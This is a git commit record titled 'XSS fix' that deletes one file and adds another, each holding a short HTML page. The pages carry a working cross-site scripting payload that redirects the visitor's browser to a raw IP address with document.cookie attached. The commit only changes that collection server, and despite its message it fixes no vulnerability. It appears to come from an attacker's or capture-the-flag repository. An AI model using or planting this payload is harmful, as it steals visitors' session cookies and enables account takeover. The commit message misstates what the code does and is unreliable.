e28f14d1968ba7b8e4393ddd5b51ffd1ccda78c8
Tim <TAbdiukov@gmail.com>
2019-04-25 02:57:04 +1000

    XSS fix

--- XSS/index.js
+++
@@ -1,4 +0,0 @@
-<!DOCTYPE html>
-<html>
-<script>document.location='http://54.180.26.120/?c='+document.cookie</script>
-</html>
---
+++ XSS/x.js
@@ -0,0 +1,4 @@
+<!DOCTYPE html>
+<html>
+<script>document.location='http://52.237.217.1/?c='+document.cookie</script>
+</html>
